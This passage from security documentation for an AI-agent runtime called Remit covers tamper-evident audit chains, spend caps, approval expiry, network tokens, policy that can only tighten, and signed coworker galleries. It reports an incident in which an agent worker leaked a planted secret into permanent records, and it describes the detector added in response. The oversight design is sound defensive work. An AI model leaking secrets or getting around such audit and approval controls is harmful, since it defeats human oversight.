what was requested, how it was classified, which rung decided it, what the
outcome was — and, since 2026-09-07, which model and provider were driving, a
hash of the system prompt the session was built on, and the coworker
definition's hash. Chaining means a row cannot be altered after the fact without
breaking every row after it, and a stored head means a deleted tail is visible
too.

There are two chains, in two files. Decisions live in `coworker.db`'s
`audit_events` table; the teams journal and board log live in `journal.db` and
`teams.db`, chained per case and per space. All three seal their records with
one primitive, the same canonical form the Python wrote.

**Check it when you want to.** `GET /v1/audit/verify` recomputes the whole
decision chain and answers `verified`, how many rows it checked, and how many
rows precede the chain. Rows written before 2026-09-07 carry no hash: they are
counted, never verified, because claiming a seal for a decision nobody sealed
would be the same invention the `risk_class` column refused. A broken chain
answers 200 with `verified: false` and what broke — a detected edit is the
answer to the question, not a server fault. The journal's equivalent is
`GET /v1/teams/journal/verify?case=`, and the board's — every item, claim,
transition and comment a team made — is `GET /v1/board/verify?space=` under the
board's own per-actor token, or `remit-board board verify` from the command
line, which exits non-zero on a break so a script can act on it.

**Adding a column later.** Every sealed row records which list of fields sealed
it, and the verifier resolves that list per row. A column added to the seal
therefore takes effect on new rows without changing any older row’s digest; with
one list for the whole table, the day a column was added would be the day every
historical row stopped verifying. Rows written before this carry no version and
are read as the original list — nothing is backfilled, for the reason
`risk_class` gives above. A row naming a list this build does not know answers
`verified: false` and names the row, and is never checked against an older list
instead: a database written by a NEWER build reads as unverifiable rather than
as forged, because the two are the same bytes and saying which would be a guess.

**What it costs.** Every model response leaves a row of its own
(`stage: model_call`) with its tokens, model, provider and which call it was —
the turn, compaction, or the title; the reviewer's calls stay on its verdict
rows. That is the spend trail the cap below reads, and the one a query can
sum by session, by model, by hour.

### How much

`tokens_per_hour` (Settings ▸ Security & trust, `config.toml`, or an
organisation's `limits.tokens_per_hour`) caps what a session spends in a rolling
hour — `tokens_in + tokens_out + cache_write` over its model-call rows, so a
long session's cheap re-reads of a cached prefix do not count against it. The
scope is the session and its team when it has one, or every run of an
automation, so neither a lead nor a nightly job can start each hour fresh. A
new turn past the cap is refused with the numbers; a turn already under way
finishes. Off by default: this is a cost control, not a floor, and an audit
store that cannot be read fails open here, logged.


An unattended prompt that nobody answers before its `approval_ttl` resolves as **expired**, recorded on its own `approval_resolved` row with `status: expired` — distinct from a person's deny, because nobody decided. Every approver treats it as a decline. A card open when the person presses Stop resolves the same way, as `status: interrupted`, and one whose answering request went away — a client that hung up, a shutdown — as `status: abandoned`. In all three the action does not run, and in none of them does the record call that a refusal: a journal that is append-only and hash-chained must not carry a decision against somebody who never made one.

## Network posture

The server binds `127.0.0.1` and requires a token on every request. The token
lives in `~/.config/coworker/sidecar-<port>.token` with owner-only permissions.

- HTTP clients send `X-Remit-Token`.
- WebSocket clients pass it as a subprotocol, because a browser cannot set
  headers on a handshake.
- The interface exchanges `?token=` for an `HttpOnly`, `SameSite=Strict` cookie
  that authorises **the interface document and its assets only** — never the
  API.

What leaves the machine on the sign-in path is worth stating: after a successful
sign-in, the local identity (name and email) is posted once to the configured
`cloud_base_url`. That is a broker you chose to point at, it is the same origin
that already holds your session, and it is never put on a URL. It is not sent
while signed out, nor while the identity is incomplete. See
[your identity](/docs/coworker/configuration/#your-identity).

Changing `host` exposes Remit to your network. There is no multi-user model, no
per-user authorisation, and the token is a single shared bearer credential:
anyone who can reach the port and read the token has full control. Put it behind
something that terminates TLS and authenticates users before you do that.

## Secrets

API keys and connector credentials live in `~/.config/coworker/secrets.json`
with owner-only permissions. They are never written to the journal, and never
sent to a model.

**A secret a coworker finds is refused on the board and in the journal.** Every
security coworker is told to record a secret by its kind and where it lives, never
its value. On the first live team run a worker wrote a planted key and password
into a board comment and its case journal anyway (2026-09-23). Both are hash-chained
records, so a value written there stays there. Now the store refuses the write,
whoever makes it: a coworker, a lead, an outside worker through `remit-board`, or
you. That covers every board item, transition and comment, every journal entry
(its body, entities and refs), team chat, and a lead's steer to a worker. The
refusal names the kind and says to record the location instead; it never repeats
the value.

Detection is by shape: a known provider token format, or a literal next to a word
such as key, secret, token or password that mixes letters and digits and is not a
reference like `os.getenv(…)`, a path, a URL or a hash. A value with no such shape,
such as a bare password in a sentence that never says what it is, still passes. So
this narrows the gap rather than closing it. Reading a file that holds a secret is
not blocked, because a reviewer has to read the code it fixes, and an exact-text
edit quotes the line it replaces.

The name and email from setup are **not** secrets and are deliberately kept out
of that file — they sit in `prefs.json` in plain text. They are self-asserted,
and they grant nothing here: no permission decision anywhere in Remit reads
them. Treat the identity as a label, not as authentication.

A self-hosted gallery may verify the address for its own purposes — some require
a one-time code before the gallery opens, because ownership of a coworker
published there rests on who published it. That check belongs to the gallery and
changes nothing on this machine: a verified address still grants no permission
in Remit. See [your identity](/docs/coworker/configuration/#your-identity).

## Nothing lowers the floor

The ladder's floors are not a default, a preference, or a tier. No mode, no setting, no click
and — when Remit Cloud's policy layer arrives — no administrator, no licence and no support
engineer can widen one. Owner ruling, 2026-09-02.

Three consequences, stated here because they constrain what can be built later:

**Central policy composes by intersection, and may only tighten.** An organisation can narrow
an allowlist, forbid a mode, cap a budget or block a connector. It cannot grant a machine more
than the machine already permits. A policy that would widen a floor is refused by the runtime,
not merely discouraged by a console — the endpoint is where this is decided, because the
endpoint is the only place that can be sure.

**Security is never a paid feature.** Every protection in this document works signed out,
offline and unlicensed: the risk classes, the ladder, the floors, workspace trust, the
reviewer, the audit journal. A subscription buys what one machine *cannot* do — policy shared
across people, evidence aggregated across a fleet, content shared across a company. It never
buys back a protection that was withheld. A product whose safety degrades without a licence is
not a safe product with a business model; it is an unsafe product.

**A compromised Remit Cloud cannot escalate anyone.** This falls out of the first rule and is
worth keeping true on purpose. Because policy can only ever narrow what an endpoint already
allows, an attacker who takes the policy service can deny service — visible, and recoverable —
but cannot hand themselves a wider floor on a single machine. That property survives exactly as
long as the tighten-only rule is enforced at the endpoint rather than in the console.

### How policy is enforced here

When signed in to a Remit Cloud, the runtime fetches the organisation's policy documents —
at sign-in and every fifteen minutes (or sooner, if a document asks) — verifies each one
against the pinned `cloud_policy_pubkey`, refuses any document whole that it cannot verify
or whose keys it cannot order, and keeps the admitted set in `policy.json` under the state
directory. Every enforcement point reads that set live:

- `config.Load` meets the file's settings with it last, so every reader sees constrained
  values: the egress allowlist, the permitted modes (a forbidden mode falls to the highest
  permitted one below it), auto-allow, allowed commands, both caps, model and proxy
  allowlists, loopback-only.
- Settings the interface keeps in prefs — the allowed-domains list, the external budget,
  auto-approve, the Grapevine switch — meet the policy at their accessors, so a preference
  cannot widen past it.
- The state-directory stores meet it where they are written or loaded: the override lock
  in the risk classifier, unattended, connectors and their tools, MCP servers and tools,
  skills by source and content hash, coworkers by source and manifest hash, workspace
  trust under allowed roots.
- Audit rows carry `policy_id`; a denial's reason is `policy:<key>`; every refusal a person
  sees says "Blocked by *org*'s policy (*family*): …" with the version, how long ago it was
  confirmed, and — when the signed document names one — where to go about it.

**What a person sees before they are refused.** Every control an organisation's policy
decides says so beside itself, in visible text: "Managed by *Acme*'s Remit admins · policy
org v3", with the contact from the document. A control that policy locks is disabled rather
than offered and refused, and a mode the organisation has not permitted is left out of the
mode menu rather than shown and rejected. A model the
allowlist excludes stays in every picker, greyed and not selectable, with the reason
beside it — the list reads as whole, and the greying reads as policy rather than as a
model that stopped working; a provider none of the patterns names is greyed as a card. The interface reads the set of *constrained* keys
for this — every key the documents carry, not merely those that changed a value here, so a
key that happens to agree with the local setting is still not presented as the person's to
change. None of that enforces anything: enforcement is at the endpoint that would otherwise
act, and an interface that disagreed with the policy would produce a refusal, never an
escape. It exists because a refusal somebody could have seen coming is the one that reads
as a broken app, and the answer to a broken app is a shadow install.

The account menu says whose policy this machine is under — the organisation's name, marked
Cloud Enterprise — and offers its owners and admins a link to the console where policy is
issued. That link is offered only to the people it would admit, and the console is a
separate surface on the server: this app is the *subject* of a policy, and putting the
issuing surface inside the thing it governs would blur the boundary the threat model rests
on.

If the organisation's policy asks for it (`"evidence": {"events": true, "anchors": true}`),
the runtime sends back two content-free things on the document's interval: the *kind* of
governed thing that happened — an approval asked for and how it went, a reviewer verdict,
an auto-allow, a mode or unattended change, a policy denial with its key, a policy fetched
or refused, and a person teaching a coworker a standing allowance (a target pinned from a
card, a host under Always-allowed destinations, a channel under Replies without asking) or
removing one — with the risk class, the tool's *name*, a hash of the session and the time; and
the heads of its teams-journal chains, with the case id hashed away, from which a rewritten
or rewound local journal is detectable there. No argument, no reason text, no message, no
name of anything but a tool or a connector ever leaves; the type that is sent has no field
for one. A taught allowance's target — the repository, the address, the channel — is
exactly such a field-less thing: the control plane learns that a person taught `send_email`
something, never to whom. Nothing is sent without the opt-in, and a cloud that is away
costs nothing but a bounded queue.

The fleet heartbeat, when the policy asks for one, is ids, versions, hashes and counts:
which build, which policy ids are held, which coworkers by hash, which connectors are
connected, every policy key this build's lattice can order — so the console can say before
issuing a key which machines would refuse the document carrying it — and how many standing
allowances people have taught here. The number, never the rules.

The gallery is a supply chain, and three things hold there. A Remit Cloud that has a
gallery key signs every coworker it serves; this runtime verifies the signature over the
exact bytes against `cloud_gallery_pubkey` and refuses one that does not verify, and refuses
an unsigned one when the policy sets `personas.require_signature`. A coworker the
organisation withdraws (`personas.revoked`) is disabled here at the next fetch and cannot
be re-enabled while it stays withdrawn. And a turn that begins from a connected platform —
a Slack message, a GitHub mention, an email, anything through the relay — has already read
outside-authored content: the message itself. It starts under the outside-content floor,
so an external-risk action taken on the strength of somebody's message reaches a person.

Past a document's `max_age` (seven days by default) its `on_stale` overlay applies on top —
something may close, nothing opens. A tightened rule applies the moment it is fetched; a
widened allowance applies at the next start, because configuration taken at startup is not
rewritten underneath running sessions. Revocation is immediate; grant waits.

## What Remit will not do for you

The agent asks before consequential actions, but approval is a real decision,
not a formality. Remit does not:

- decide that a command is safe because it looks read-only
- treat content it reads (files, web pages, tool output) as instructions
- grant itself persistent authority without a human approval
